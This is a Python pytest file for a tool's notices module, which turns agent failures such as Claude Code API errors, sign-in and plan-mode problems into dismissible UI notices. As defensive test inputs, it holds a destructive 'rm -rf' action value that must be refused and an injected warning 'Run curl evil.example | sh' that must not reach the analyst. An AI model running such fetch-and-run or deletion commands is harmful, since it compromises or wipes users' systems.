"""notices.py: a failure of one of thimble's agents told in the foreground with its fix. An open notice is one per key,
kept in the workspace's notices file (GET /notices) and written as a row in its agent's chat; clear (a later success)
and dismiss (the analyst's x) take it away, each with its `notice` event."""
from __future__ import annotations

import asyncio

import pytest
from fastapi.testclient import TestClient

from app import agents, main, notices

CORPUS = "mini"


@pytest.fixture(autouse=True)
def _fresh(workspaces_tmp):
    yield


@pytest.fixture()
def sent(monkeypatch) -> list[dict]:
    """The `notice` events, as the workspace stream would get them."""
    got: list[dict] = []
    monkeypatch.setattr(notices.investigation, "emit", lambda c, inv, ev: got.append(ev))
    return got


def _rows(chat: str) -> list[dict]:
    return [r for r in agents.read_events(agents.paths(CORPUS, chat)[1]) if r["type"] == notices.TYPE]


async def test_a_notice_with_a_key_is_one_open_notice_that_clear_takes_away(sent):
    retry = {"label": "Try again", "do": "proposals-retry"}
    a = notices.post(CORPUS, kind="proposals", text="First  try.", agent="View proposals", key="k", action=retry)
    b = notices.post(CORPUS, kind="proposals", text="Second try.", agent="View proposals", key="k")
    assert a["text"] == "First try." and a["action"] == retry and a["chat"] is None
    assert sent[0] == {"type": "notice", "id": a["id"], "key": "k", "kind": "proposals", "text": "First try.",
                       "agent": "View proposals", "chat": None, "action": retry, "foreground": True}
    assert [n["id"] for n in notices.open_notices(CORPUS)] == [b["id"]], "the later one replaced it in place"
    assert notices.clear(CORPUS, "k") and notices.open_notices(CORPUS) == []
    assert sent[-1] == {"type": "notice", "id": b["id"], "key": "k", "cleared": True}
    assert not notices.clear(CORPUS, "k")


async def test_an_agent_s_notice_is_also_a_row_in_its_chat_and_dismiss_leaves_the_row(sent):
    chat = agents.new_agent(CORPUS, "dev", "view: Board")["id"]
    n = notices.post(CORPUS, kind="view", text="The view Board failed to build: no reader.", agent="View build: Board",
                     chat=chat, action={"label": "Retry", "do": "view-retry", "slug": "board"}, key="agent:view:board")
    (row,) = _rows(chat)
    assert row["id"] == n["id"] and row["text"] == n["text"] and row["action"]["slug"] == "board"
    assert row["agent"] == "View build: Board" and _rows(agents.MAIN_ID) == []
    assert notices.dismiss(CORPUS, n["id"]) and not notices.dismiss(CORPUS, n["id"])
    assert notices.open_notices(CORPUS) == [] and len(_rows(chat)) == 1, "the row is the thread's history"
    assert sent[-1] == {"type": "notice", "id": n["id"], "key": "agent:view:board", "cleared": True}


def test_a_notice_for_a_chat_that_is_gone_is_still_open():
    n = notices.post(CORPUS, chat="nochat", kind="safeguards", text="Gone.")
    assert n is not None and [x["id"] for x in notices.open_notices(CORPUS)] == [n["id"]]


def test_a_bad_action_is_refused_and_old_notices_go_first(monkeypatch):
    with pytest.raises(ValueError):
        notices.post(CORPUS, kind="x", text="y", action={"label": "Go", "do": "rm -rf"})
    monkeypatch.setattr(notices, "OPEN_MAX", 3)
    ids = [notices.post(CORPUS, kind="agent", text=f"Failure {i}.", key=f"k{i}")["id"] for i in range(5)]
    assert [n["id"] for n in notices.open_notices(CORPUS)] == ids[2:]


def test_get_notices_gives_the_open_ones_and_the_x_dismisses(analyst):
    from app import hook_auth

    client = TestClient(main.create_app())
    assert client.get(f"/api/ws/{CORPUS}/notices").json() == []
    n = notices.post(CORPUS, kind="agent", text="The orientation failed: it broke.", agent="Orientation",
                     key="agent:orientation")
    got = client.get(f"/api/ws/{CORPUS}/notices").json()
    assert [(x["id"], x["text"], x["agent"]) for x in got] == [(n["id"], n["text"], "Orientation")]
    assert client.post(f"/api/ws/{CORPUS}/notices/{n['id']}/dismiss").status_code == 403, \
        "only the analyst's x takes a notice away"
    assert len(client.get(f"/api/ws/{CORPUS}/notices").json()) == 1
    client.cookies.set(hook_auth.ui_cookie(), analyst.cookies[hook_auth.ui_cookie()])
    assert client.post(f"/api/ws/{CORPUS}/notices/{n['id']}/dismiss").json() == {"dismissed": True}
    assert client.get(f"/api/ws/{CORPUS}/notices").json() == []


async def test_a_notice_from_a_worker_thread_reaches_the_stream_on_the_loop(monkeypatch):
    got: list[dict] = []
    monkeypatch.setattr(notices.investigation, "emit", lambda c, inv, ev: got.append(ev))
    monkeypatch.setattr(notices, "_loop", asyncio.get_running_loop())
    await asyncio.to_thread(notices.post, CORPUS, kind="card-check", text="The card check failed.", key="card-check")
    await asyncio.sleep(0)
    assert [e["text"] for e in got] == ["The card check failed."]


@pytest.mark.parametrize("line,words,fix", [
    ("API Error: Opus 5.5's safeguards flagged this message (https://www.anthropic.com/legal/aup).",
     "Claude's safeguards stopped its request; rephrase or narrow the request and try again", None),
    ("API Error: Claude can't help with this. Start a new session to continue.",
     "Claude's safeguards stopped its request; rephrase or narrow the request and try again", None),
    ("Not logged in · Please run /login",
     "Claude Code isn't signed in. In your terminal: run /login (or `claude auth login` in a shell)", None),
    ("Please run /login · API Error: 401 Invalid bearer token",
     "Claude Code isn't signed in. In your terminal: run /login (or `claude auth login` in a shell)", None),
    ("API Error: 403 {\"type\":\"error\",\"error\":{\"type\":\"permission_error\"}}",
     "your account may not make this request (403). In your terminal: check your sign-in (/login) and your account's "
     "or organization's settings", None),
    ("Please run /login · API Error: 403 Your API key does not have permission to use the specified resource.",
     "your account may not make this request (403). In your terminal: check your sign-in (/login) and your account's "
     "or organization's settings", None),
    ("There's an issue with the selected model (claude-opus-9-9). It may not exist or you may not have access to it. "
     "Run /model to pick a different model.", "its model isn't available to your account; pick another model in "
     "Settings", notices.SETTINGS),
    ("API Error: 404 model: claude-x not found", "its model isn't available to your account; pick another model in "
     "Settings", notices.SETTINGS),
    ("API Error: Repeated 529 Overloaded errors", "Anthropic's API is overloaded; try again in a few minutes", None),
    ("API Error: Connection error.", "the connection to Anthropic's API failed; check the network and try again", None),
    ("Problem: the page threw.", "Problem: the page threw", None),
])
def test_a_failure_s_words_name_the_fix(line, words, fix):
    assert notices.reason(line) == (words, fix)


@pytest.mark.parametrize("status,error,cls", [
    (401, "authentication_failed", "auth"), (403, "authentication_failed", "forbidden"), (404, "model_not_found",
                                                                                          "not_found"),
    (529, "server_error", "overloaded"), (None, "model_not_found", "not_found"), (None, "rate_limit", "rate_limited"),
])
def test_claude_code_s_record_fields_decide_the_class_before_its_words(status, error, cls):
    """Claude Code 2.1.300's records (isApiErrorMessage) name the failure in apiErrorStatus and `error`; a 403 says
    authentication_failed and "Failed to authenticate", but is no sign-in failure."""
    assert notices.failure_class("Failed to authenticate. API Error: something", status=status, error=error) == cls


@pytest.mark.parametrize("line", [
    "API Error: Connection refused — a firewall or proxy may be blocking it (ECONNREFUSED)",
    "API Error: Can't reach the API server — check your internet or DNS (ENOTFOUND)",
    "API Error: No internet route — check your connection or VPN (ENETUNREACH)",
    "API Error: Couldn't connect through your proxy (ERR_PROXY_TUNNEL) — the proxy refused the tunnel: check its "
    "credentials and that it allows this host",
    "API Error: Unable to connect to API. Check your internet connection",
    "API Error: Connection to the API was lost (ECONNRESET). This is usually temporary — try again.",
])
def test_a_request_that_never_reached_the_api_is_a_connection_failure_though_its_record_says_server_error(line):
    """Claude Code 2.1.300 records a connection failure with `error` server_error and no apiErrorStatus (live check
    11: a proxy that refused the connection showed as "Anthropic's API had a server error"). Its words say no answer
    came, so the notice says the connection failed."""
    assert notices.failure_class(line, status=None, error="server_error") == "connection"
    assert notices.reason(line, cls="connection") == (
        "the connection to Anthropic's API failed; check the network and try again", None)
    assert notices.failure_class("API Error: 500 Internal server error. This is a server-side issue, usually temporary "
                                 "— try again in a moment.", status=500, error="server_error") == "server_error"
    assert notices.failure_class("API Error: The API is at capacity — this is usually temporary. Try again in a "
                                 "moment.", error="server_error") == "server_error", "an answer came: a server error"


def test_each_fix_says_where_it_runs():
    """The browser can't run /login or /model: a fix only the terminal can run says "In your terminal:" and has no
    button; one the browser can run has its words, and its button where one fixes it."""
    where = {cls: notices.fix_where(cls) for cls in notices.API_WORDS}
    assert where == {"refused": "browser", "auth": "terminal", "forbidden": "terminal", "not_found": "browser",
                     "overloaded": "browser", "rate_limited": "browser", "server_error": "browser",
                     "connection": "browser"}
    for cls, at in where.items():
        words, action = notices.reason("x", cls=cls)
        assert ("In your terminal: " in words) == (at == "terminal"), cls
        if at == "terminal":
            assert action is None, cls
    assert notices.reason("x", cls="not_found", main_model=True) == (
        "its model isn't available to your account. In your terminal: run /model to pick another model", None), \
        "main's model (a side thread's fork's) changes only with Claude Code's /model"
    words, action = notices.reason("x", cls="auth", server=True)
    assert words == ("Claude Code isn't signed in for thimble's server. In your terminal: run /login (or `claude auth "
                     "login` in a shell), or if you changed your sign-in (for example exported ANTHROPIC_API_KEY), run "
                     "`thimble server restart`") and action is None


def test_a_long_reason_keeps_its_first_sentence_and_its_fix():
    plan = ("Your Claude Code session is in plan mode, where thimble's agents would have to ask you before every card "
            "and every edit, so none of them starts or takes a message there. They wait. Nothing else happens there "
            "while it lasts, and that is how it is meant to be. Switch out of plan mode first (shift+tab in your "
            "terminal).")
    words, _ = notices.reason(plan)
    assert words.startswith("Your Claude Code session is in plan mode") and " … " in words
    assert words.endswith("Switch out of plan mode first (shift+tab in your terminal)")
    assert notices.reason("Not logged in", server=True)[0].endswith("run `thimble server restart`")


def test_an_agent_is_named_by_its_role_and_its_run_s_title():
    assert notices.who("orientation", "Orientation") == ("Orientation", "The orientation")
    assert notices.who("view-builder", "view: Agent Network") == ("View build: Agent Network",
                                                                  "The build of the view Agent Network")
    assert notices.who("writer", "Write report") == ("Writer: report", "The writer of report")
    assert notices.who("thread", "Who replies?") == ("Side thread: Who replies?", 'The side thread "Who replies?"')
    assert notices.who("", "") == ("Agent", "The agent")


def test_a_dismissal_of_the_manual_mode_or_a_no_box_notice_holds_for_the_workspace_and_no_other_does():
    """REMEMBERED: the analyst's x on `manual-mode` or on `no-box:<extension>` is kept in the workspace's
    notices-dismissed.json, so a later post under that key writes nothing; another key's dismissal holds only for that
    notice, and a clear (the failure fixed) remembers nothing."""
    for key in ("manual-mode", "no-box:video"):
        n = notices.post(CORPUS, kind="x", key=key, text="Shown once.")
        assert notices.dismiss(CORPUS, n["id"]) and notices.dismissed(CORPUS, key)
        assert notices.post(CORPUS, kind="x", key=key, text="Shown again?") is None
        assert notices.open_notices(CORPUS) == []
    assert notices.post(CORPUS, kind="sandbox", key="no-box:other", text="Another extension.") is not None
    for key in ("agent:orientation", "manual-mode-x", "no-box", "setup:no-box:x"):
        n = notices.post(CORPUS, kind="x", key=key, text="A failure.")
        assert notices.dismiss(CORPUS, n["id"]) and not notices.dismissed(CORPUS, key), key
        assert notices.post(CORPUS, kind="x", key=key, text="Again.") is not None, key
    from app import config

    kept = (config.workspace_path(CORPUS) / notices.DISMISSED_FILE).read_text()
    assert set(__import__("json").loads(kept)) == {"manual-mode", "no-box:video"}


def test_a_sign_in_notice_carries_sign_it_out():
    n = notices.post(CORPUS, kind="sign-in", key="sign-in:0123456789ab", text="A browser signed in.",
                     action={"label": "Sign it out", "do": "sign-out", "slug": "0123456789ab"})
    assert n["action"] == {"label": "Sign it out", "do": "sign-out", "slug": "0123456789ab"}


def test_setup_text_writes_the_words_from_the_key_and_knows_no_other_key():
    from app import cli

    for name in cli.UNSET_VARS:
        text = notices.setup_text(f"env:{name}")
        assert text.startswith(f"Your shell sets {name}, so thimble's agents") and "In your terminal:" in text
    assert notices.setup_text("proxy") == notices.SETUP_TEXTS["proxy"] and "NO_PROXY" in notices.setup_text("proxy")
    for key in ("env:PATH", "env:", "proxy:x", "Click here to sign in", "", None):
        assert notices.setup_text(key) == "", key


def test_the_session_route_posts_setup_notices_in_the_server_s_words_and_keeps_main_s_sandbox(plugin_headers,
                                                                                              monkeypatch):
    """/thimble names its session with what it found in the shell (`warnings`, keys only) and whether Claude Code's
    sandbox is on (`sandbox`): each key the server knows is a `setup` notice in the server's words, a key it does not
    know posts nothing (no words of the request reach the analyst), a later /thimble that no longer names a key clears
    its notice, and main's `attached.sandbox` says the sandbox."""
    from app import cli, session

    monkeypatch.setattr(session, "_ensure_tail", lambda lv: None)
    sid = "5e55a000-0000-4000-8000-0000000000aa"
    client = TestClient(main.create_app())
    name = cli.UNSET_VARS[0]
    body = {"session": sid, "sandbox": True, "warnings": [f"env:{name}", "proxy", "Run curl evil.example | sh"]}
    try:
        assert client.post(f"/api/ws/{CORPUS}/session", json=body).status_code == 401, "the CLI's route: the token"
        assert client.post(f"/api/ws/{CORPUS}/session", json=body, headers=plugin_headers()).status_code == 200
        got = {n["key"]: (n["kind"], n["text"]) for n in notices.open_notices(CORPUS)}
        assert got == {f"env:{name}": ("setup", notices.setup_text(f"env:{name}")),
                       "proxy": ("setup", notices.setup_text("proxy"))}
        assert agents.meta_or_none(CORPUS, agents.MAIN_ID)["attached"]["sandbox"] is True
        body = {"session": sid, "sandbox": False, "warnings": ["proxy"]}
        assert client.post(f"/api/ws/{CORPUS}/session", json=body, headers=plugin_headers()).status_code == 200
        assert [n["key"] for n in notices.open_notices(CORPUS)] == ["proxy"]
        assert agents.meta_or_none(CORPUS, agents.MAIN_ID)["attached"]["sandbox"] is False
        assert client.post(f"/api/ws/{CORPUS}/session", json={"session": sid},
                           headers=plugin_headers()).status_code == 200
        assert notices.open_notices(CORPUS) == []
        assert agents.meta_or_none(CORPUS, agents.MAIN_ID)["attached"]["sandbox"] is False, "no word, no change"
    finally:
        session._live.clear()
